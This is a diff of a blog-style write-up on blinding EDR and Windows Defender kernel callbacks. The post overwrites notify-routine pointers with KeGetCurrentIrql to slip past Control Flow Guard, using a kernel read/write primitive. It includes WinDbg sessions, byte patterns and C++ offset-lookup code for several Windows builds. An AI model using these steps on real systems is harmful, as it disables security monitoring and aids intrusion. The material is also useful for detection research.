@@ -85,7 +85,7 @@ fffff807`23c1b2dc 488bf8          mov     rdi,rax
 fffff807`23c1b2df 4885c0          test    rax,rax
 fffff807`23c1b2e2 0f84ae630f00    je      nt!PspSetCreateProcessNotifyRoutine+0xf640e (fffff807`23d11696)
 fffff807`23c1b2e8 33db            xor     ebx,ebx
-<span style="color: green;">fffff807`23c1b2ea 4c8d2d0f124f00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff807`2410c500)]</span>
+<mark>fffff807`23c1b2ea 4c8d2d0f124f00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff807`2410c500)]</mark>
 fffff807`23c1b2f1 488d0cdd00000000 lea     rcx,[rbx*8]
 fffff807`23c1b2f9 4533c0          xor     r8d,r8d
 fffff807`23c1b2fc 4903cd          add     rcx,r13
@@ -105,30 +105,30 @@ fffff807`2410c560  00000000`00000000 00000000`00000000
 fffff807`2410c570  00000000`00000000 00000000`00000000
 </pre>
 
-Each one of these entries are a callback registred by an EDR sys driver, lets take the second entry as an example <span style="color: green;">ffff800e`5c7f725f</span>
+Each one of these entries are a callback registred by an EDR sys driver, lets take the second entry as an example <mark>ffff800e`5c7f725f</mark>
 
 First we need to remove the last byte and null it out (The last 4 bits of these pointer addresses are insignificant), to access the callback entry structure.
 
 <pre>
 lkd> ? (ffff800e`5c7f725f >> 4) << 4
-Evaluate expression: -140675806956976 = ffff800e`5c7f725<span style="color: green;">0</span>
+Evaluate expression: -140675806956976 = ffff800e`5c7f725<mark>0</mark>
 lkd> dq ffff800e`5c7f7250 L4
-ffff800e`5c7f7250  00000000`00000020 <span style="color: green;">fffff807`252e9b70</span>
+ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`252e9b70</mark>
 ffff800e`5c7f7260  00000000`00000006 00000000`00000000
 lkd> u fffff807`252e9b70 L3
-<span style="color: green;">WdFilter!MpCreateProcessNotifyRoutineEx:</span>
+<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
 fffff807`252e9b70 48895c2410      mov     qword ptr [rsp+10h],rbx
 fffff807`252e9b75 48894c2408      mov     qword ptr [rsp+8],rcx
 fffff807`252e9b7a 55              push    rbp
 </pre>
 
-The second entry which is <span style="color: green;">fffff807`252e9b70</span> is one of the functions that will be called when you create a process (WdFilter driver is related to windows defender). and this is only one of the callback entries.
+The second entry which is <mark>fffff807`252e9b70</mark> is one of the functions that will be called when you create a process (WdFilter driver is related to windows defender). and this is only one of the callback entries.
 
-So in the original cheeckyblinder project what he did is he nulled the whole entry in the callback table which is this one <span style="color: green;">ffff800e`5c7f725f</span>, so using a R/W primitive kernel exploit we can null the entry, and this is what the callback table looks like after nulling it out.
+So in the original cheeckyblinder project what he did is he nulled the whole entry in the callback table which is this one <mark>ffff800e`5c7f725f</mark>, so using a R/W primitive kernel exploit we can null the entry, and this is what the callback table looks like after nulling it out.
 
 <pre>
 lkd> dq nt!PspCreateProcessNotifyRoutine
-fffff807`2410c500  ffff800e`5beb7b4f <span style="color: green;">00000000`00000000</span>
+fffff807`2410c500  ffff800e`5beb7b4f <mark>00000000`00000000</mark>
 fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
 fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
 fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
@@ -144,7 +144,7 @@ but what I did is, instead of nulling the whole entry, I changed the function in
 
 <pre>
 lkd> dq nt!PspCreateProcessNotifyRoutine
-fffff807`2410c500  ffff800e`5beb7b4f <span style="color: green;">ffff9b02`251f6dff</span>
+fffff807`2410c500  ffff800e`5beb7b4f <mark>ffff9b02`251f6dff</mark>
 fffff807`2410c510  ffff800e`5c7f758f ffff800e`5c7f7a9f
 fffff807`2410c520  ffff800e`5cdd5c2f ffff800e`5cdd652f
 fffff807`2410c530  ffff800e`5cdd6a9f ffff800e`5e896edf
@@ -153,9 +153,9 @@ fffff807`2410c550  00000000`00000000 00000000`00000000
 fffff807`2410c560  00000000`00000000 00000000`00000000
 fffff807`2410c570  00000000`00000000 00000000`00000000
 lkd> dq ffff9b02`251f6df0 L2
-ffff9b02`251f6df0  00000000`00000020 <span style="color: green;">fffff804`8fdea060</span>
+ffff9b02`251f6df0  00000000`00000020 <mark>fffff804`8fdea060</mark>
 lkd> u fffff804`8fdea060 L2
-<span style="color: green;">nt!KeGetCurrentIrql:</span>
+<mark>nt!KeGetCurrentIrql:</mark>
 fffff804`8fdea060 440f20c0        mov     rax,cr8
 fffff804`8fdea064 c3              ret
 </pre>
@@ -174,17 +174,17 @@ lkd> u FLTMGR!FltDoCompletionProcessingWhenSafe+0x77
 FLTMGR!FltDoCompletionProcessingWhenSafe+0x77:
 fffff807`1ee01567 488bcd          mov     rcx,rbp
 fffff807`1ee0156a bf01000000      mov     edi,1
-<span style="color: green;">fffff807`1ee0156f ff1583450300    call    qword ptr [FLTMGR!_guard_dispatch_icall_fptr (fffff807`1ee35af8)]</span>
+<mark>fffff807`1ee0156f ff1583450300    call    qword ptr [FLTMGR!_guard_dispatch_icall_fptr (fffff807`1ee35af8)]</mark>
 fffff807`1ee01575 8bd8            mov     ebx,eax
 fffff807`1ee01577 41891e          mov     dword ptr [r14],ebx
 fffff807`1ee0157a 408ac7          mov     al,dil
 fffff807`1ee0157d 488b5c2450      mov     rbx,qword ptr [rsp+50h]
 fffff807`1ee01582 488b6c2458      mov     rbp,qword ptr [rsp+58h]
 lkd> dqs FLTMGR!_guard_dispatch_icall_fptr L1
-fffff807`1ee35af8  fffff807`23820170 <span style="color: green;">nt!guard_dispatch_icall</span>
+fffff807`1ee35af8  fffff807`23820170 <mark>nt!guard_dispatch_icall</mark>
 lkd> u fffff807`23820170
 nt!guard_dispatch_icall:
-<span style="color: green;">fffff807`23820170 4c8b1d89179e00  mov     r11,qword ptr [nt!guard_icall_bitmap (fffff807`24201900)]</span>
+<mark>fffff807`23820170 4c8b1d89179e00  mov     r11,qword ptr [nt!guard_icall_bitmap (fffff807`24201900)]</mark>
 fffff807`23820177 4885c0          test    rax,rax
 </pre>
 
@@ -207,7 +207,7 @@ ffffa8b7`b1b24b40  00410004`00004400
 
 lkd> .formats 00410004`00004400
 Evaluate expression:
-Binary:  00000000 0<span style="color: green;">1</span>000001 00000000 00000100 00000000 00000000 01000100 00000000
+Binary:  00000000 0<mark>1</mark>000001 00000000 00000100 00000000 00000000 01000100 00000000
 </pre>
 
 The `BitToCheck` which in our case is the bit 54 needs to be `1`, if it's `1` it means the call is valid which is the case for `KeGetCurrentIrql`.
@@ -216,19 +216,19 @@ So the plan is to replace the function pointing to the AV function to be called 
 
 <pre>
 lkd> u KeGetCurrentIrql L2
-<span style="color: green;">nt!KeGetCurrentIrql:</span>
-<span style="color: green;">fffff807`23623fb0</span> 440f20c0        mov     rax,cr8
+<mark>nt!KeGetCurrentIrql:</mark>
+<mark>fffff807`23623fb0</mark> 440f20c0        mov     rax,cr8
 fffff807`23623fb4 c3              ret
 lkd> dq ffff800e`5c7f7250 L4
-ffff800e`5c7f7250  00000000`00000020 <span style="color: red;"><del>fffff807`252e9b70</del></span>
+ffff800e`5c7f7250  00000000`00000020 <mark><del>fffff807`252e9b70</del></mark>
 ffff800e`5c7f7260  00000000`00000006 00000000`00000000
 lkd> eq ffff800e`5c7f7258 fffff807`23623fb0
 lkd> dq ffff800e`5c7f7250 L4
-ffff800e`5c7f7250  00000000`00000020 <span style="color: green;">fffff807`23623fb0</span>
+ffff800e`5c7f7250  00000000`00000020 <mark>fffff807`23623fb0</mark>
 ffff800e`5c7f7260  00000000`00000006 00000000`00000000
 lkd> u fffff807`252e9b70 L2
-<span style="color: red;">WdFilter!MpCreateProcessNotifyRoutineEx:</span>
-<span style="color: red;">fffff805`55e99b70</span> 48895c2410      mov     qword ptr [rsp+10h],rbx
+<mark>WdFilter!MpCreateProcessNotifyRoutineEx:</mark>
+<mark>fffff805`55e99b70</mark> 48895c2410      mov     qword ptr [rsp+10h],rbx
 fffff805`55e99b75 48894c2408      mov     qword ptr [rsp+8],rcx
 </pre>
 
@@ -248,7 +248,7 @@ First you need double check the bytes did not change for your windows OS.
 
 <pre>
 struct Offsets {
-    <span style="color: red;">DWORD64 process;</span>
+    <mark>DWORD64 process;</mark>
     DWORD64 image;
     DWORD64 thread;
     DWORD64 registry;
@@ -267,7 +267,7 @@ struct Offsets getVersionOffsets() {
     case 2004:
         return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
     case 2009:
-        return { <span style="color: red;">0x7340fe8341f63345</span>, 0x8d48d68b48c03345, 0x48d90c8d48c03345, 0x4024448948f88b48 };
+        return { <mark>0x7340fe8341f63345</mark>, 0x8d48d68b48c03345, 0x48d90c8d48c03345, 0x4024448948f88b48 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
 
@@ -301,17 +301,17 @@ fffff800`a4e61ff3 4c8bf9          mov     r15,rcx
 fffff800`a4e61ff6 f6c201          test    dl,1
 fffff800`a4e61ff9 0f8487000000    je      nt!PspSetCreateProcessNotifyRoutine+0xb6 (fffff800`a4e62086)
 fffff800`a4e61fff 65488b2c2588010000 mov   rbp,qword ptr gs:[188h]
-<span style="color: green;">fffff800`a4e62008 4c8d2d712a4a00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff800`a5304a80)]</span>
+<mark>fffff800`a4e62008 4c8d2d712a4a00  lea     r13,[nt!PspCreateProcessNotifyRoutine (fffff800`a5304a80)]</mark>
 fffff800`a4e6200f 83c8ff          or      eax,0FFFFFFFFh
 fffff800`a4e62012 660185e4010000  add     word ptr [rbp+1E4h],ax
 fffff800`a4e62019 90              nop
-<span style="color: green;">fffff800`a4e6201a 4533f6          xor     r14d,r14d
+<mark>fffff800`a4e6201a 4533f6          xor     r14d,r14d
 fffff800`a4e6201d 4183fe40        cmp     r14d,40h
-fffff800`a4e62021 7338            jae     nt!PspSetCreateProcessNotifyRoutine+0x8b (fffff800`a4e6205b)</span>
+fffff800`a4e62021 7338            jae     nt!PspSetCreateProcessNotifyRoutine+0x8b (fffff800`a4e6205b)</mark>
 fffff800`a4e62023 4e8d24f500000000 lea     r12,[r14*8]
 </pre>
 
-And so the bytes that we can use for example is the highlighed one in green starting from xor, but we need to write them in the c variable in reverse (little endian arch) which is `0x7340fe8341f63345`.
+And so the bytes that we can use for example is the highlighed ones starting from xor, but we need to write them in the c variable in reverse (little endian arch) which is `0x7340fe8341f63345`.
 
 <pre>
 lkd> dq ffffff800`a4e6201a L1
@@ -336,13 +336,13 @@ void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {
 	DWORD offset;
 
 	BOOL b = this->objMemHandler->VirtualRead(
-		(DWORD64)patternaddress - <span style="color: green;">0x0f</span>,
+		(DWORD64)patternaddress - <mark>0x0f</mark>,
 		&offset,
 		sizeof(offset)
 	);
 
 	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
-	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - <span style="color: green;">0x0f</span> + 0x04;
+	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - <mark>0x0f</mark> + 0x04;
   ....................
 }
 </pre>
@@ -376,7 +376,7 @@ First let's get the offset to the function from the nt base
 
 <pre>
 lkd> ? nt!PspSetCreateProcessNotifyRoutine - nt
-Evaluate expression: 8499848 = <span style="color: green;">00000000`00a61fd0</span>
+Evaluate expression: 8499848 = <mark>00000000`00a61fd0</mark>
 </pre>
 
 Then copy the `ntoskrnl.exe` from `c:/windows/system32` to open it in IDA.
@@ -431,10 +431,10 @@ fffff800`a4b54b36 746f            je      nt!PspSetCreateThreadNotifyRoutine+0x8
 fffff800`a4b54b38 33db            xor     ebx,ebx
 fffff800`a4b54b3a 83fb40          cmp     ebx,40h
 fffff800`a4b54b3d 735e            jae     nt!PspSetCreateThreadNotifyRoutine+0x85 (fffff800`a4b54b9d)
-<span style="color: green;">fffff800`a4b54b3f 488d0d3afd7a00  lea     rcx,[nt!PspCreateThreadNotifyRoutine (fffff800`a5304880)]</span>
-<span style="color: green;">fffff800`a4b54b46 4533c0          xor     r8d,r8d
+<mark>fffff800`a4b54b3f 488d0d3afd7a00  lea     rcx,[nt!PspCreateThreadNotifyRoutine (fffff800`a5304880)]</mark>
+<mark>fffff800`a4b54b46 4533c0          xor     r8d,r8d
 fffff800`a4b54b49 488d0cd9        lea     rcx,[rcx+rbx*8]
-fffff800`a4b54b4d 488bd7          mov     rdx,rdi</span>
+fffff800`a4b54b4d 488bd7          mov     rdx,rdi</mark>
 fffff800`a4b54b50 e8774ac6ff      call    nt!ExCompareExchangeCallBack (fffff800`a47b95cc)
 </pre>
 
@@ -449,7 +449,7 @@ fffff800`a4b54b46  48d90c8d`48c03345
 struct Offsets {
     DWORD64 process;
     DWORD64 image;
-    <span style="color: green;">DWORD64 thread;</span>
+    <mark>DWORD64 thread;</mark>
     DWORD64 registry;
 };
 
@@ -466,7 +466,7 @@ struct Offsets getVersionOffsets() {
     case 2004:
         return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
     case 2009:
-        return { 0x7340fe8341f63345, 0x8d48d68b48c03345, <span style="color: green;">0x48d90c8d48c03345</span>, 0x4024448948f88b48 };
+        return { 0x7340fe8341f63345, 0x8d48d68b48c03345, <mark>0x48d90c8d48c03345</mark>, 0x4024448948f88b48 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
 
@@ -508,10 +508,10 @@ fffff800`a4e5c99f 8bfb            mov     edi,ebx
 fffff800`a4e5c9a1 83ff40          cmp     edi,40h
 fffff800`a4e5c9a4 7365            jae     nt!PsSetLoadImageNotifyRoutineEx+0x9b (fffff800`a4e5ca0b)
 fffff800`a4e5c9a6 8bc7            mov     eax,edi
-<span style="color: green;">fffff800`a4e5c9a8 488d0dd17c4a00  lea     rcx,[nt!PspLoadImageNotifyRoutine (fffff800`a5304680)]
+<mark>fffff800`a4e5c9a8 488d0dd17c4a00  lea     rcx,[nt!PspLoadImageNotifyRoutine (fffff800`a5304680)]
 fffff800`a4e5c9af 4533c0          xor     r8d,r8d
 fffff800`a4e5c9b2 488bd6          mov     rdx,rsi
-fffff800`a4e5c9b5 488d0cc1        lea     rcx,[rcx+rax*8]</span>
+fffff800`a4e5c9b5 488d0cc1        lea     rcx,[rcx+rax*8]</mark>
 </pre>
 
 same as the others, we need to make sure the bytes are correct `0x8d48d68b48c03345` and the offset is still the same `0x04` and find 2 functions close to `nt!PsSetLoadImageNotifyRoutineEx` for the byte search.
@@ -557,11 +557,11 @@ And luckily the first function `CmUnRegisterCallback` is also an exported functi
 
 <pre>
 nt!CmUnRegisterCallback+0x58:
-<span style="color: green;">fffff800`a4baeaa8 488d0de1827400  lea     rcx,[nt!CallbackListHead (fffff800`a52f6d90)]</span>
+<mark>fffff800`a4baeaa8 488d0de1827400  lea     rcx,[nt!CallbackListHead (fffff800`a52f6d90)]</mark>
 fffff800`a4baeaaf e85cd03c00      call    nt!CmListGetNextElement (fffff800`a4f7bb10)
-<span style="color: green;">fffff800`a4baeab4 488bf8          mov     rdi,rax
+<mark>fffff800`a4baeab4 488bf8          mov     rdi,rax
 fffff800`a4baeab7 4889442440      mov     qword ptr [rsp+40h],rax
-fffff800`a4baeabc 4885c0          test    rax,rax</span>
+fffff800`a4baeabc 4885c0          test    rax,rax</mark>
 fffff800`a4baeabf 0f848d000000    je      nt!CmUnRegisterCallback+0x102 (fffff800`a4baeb52)
 fffff800`a4baeac5 48395818        cmp     qword ptr [rax+18h],rbx
 fffff800`a4baeac9 75d5            jne     nt!CmUnRegisterCallback+0x50 (fffff800`a4baeaa0)
@@ -600,7 +600,7 @@ ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
 ffffd182`c338ff80  00000000`00000000
 ffffd182`c338ff88  01db94d7`cec0b740
 ffffd182`c338ff90  00000000`00000000
-<span style="color: green;">ffffd182`c338ff98  fffff800`37f98000 WdFilter+0x28000</prte>
+<mark>ffffd182`c338ff98  fffff800`37f98000 WdFilter+0x28000</mark>
 </pre>
 
 We have 2 options to bypass this:
